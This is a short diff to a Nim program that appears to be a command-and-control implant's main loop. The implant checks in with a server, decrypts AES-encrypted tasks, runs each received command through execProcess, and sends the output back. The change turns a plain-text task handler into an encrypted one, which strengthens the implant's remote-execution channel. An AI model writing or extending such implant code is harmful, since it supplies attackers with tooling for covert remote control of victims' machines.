@@ -9,14 +9,13 @@ proc main() =
 
   while true:
     echo "[*] Sending checkin..."
-    let response = sendCheckin(agentID)
+    let response = sendCheckin(agentID) #response of the post request made to endpoint , contains (task_id,cmd)
 
     if response.len > 0:
-      echo fmt"[+] Task received: {response}"
-      # In MVP: treat response as a simple shell command
-      let task = response
-      let output = execProcess(task)
-      discard sendTaskResult(agentID, output)
+      let rawtask = decryptJson(response,AES_KEY)
+      let parsedtask = parseTask(rawtask)
+      let output = execProcess(parsedtask.command)
+      discard sendTaskResult(agentID,parsedtask.task_id,parsedtask.command,output)
 
     randomSleep(SLEEP_MIN, SLEEP_MAX)
 
